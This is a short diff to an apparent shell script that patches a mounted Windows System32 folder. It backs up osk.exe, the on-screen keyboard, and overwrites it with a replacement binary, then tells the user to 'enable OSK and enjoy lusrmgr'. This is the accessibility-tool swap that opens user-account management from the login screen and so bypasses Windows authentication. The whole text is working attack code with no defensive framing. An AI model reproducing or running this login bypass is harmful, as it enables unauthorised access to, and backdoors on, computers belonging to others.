@@ -36,6 +36,6 @@ fi
 # Logic parts
 cd drive/Windows/System32 
 sudo cp -fpr osk.exe wtf.exe 
-sudo cp -fpr Netplwiz.exe osk.exe 
+sudo cp -fpr $MYDIR/osk.exe .
 echo "Patching done !"
-echo "Enable OSK and enjoy netplwiz !"
+echo "Enable OSK and enjoy lusrmgr !"
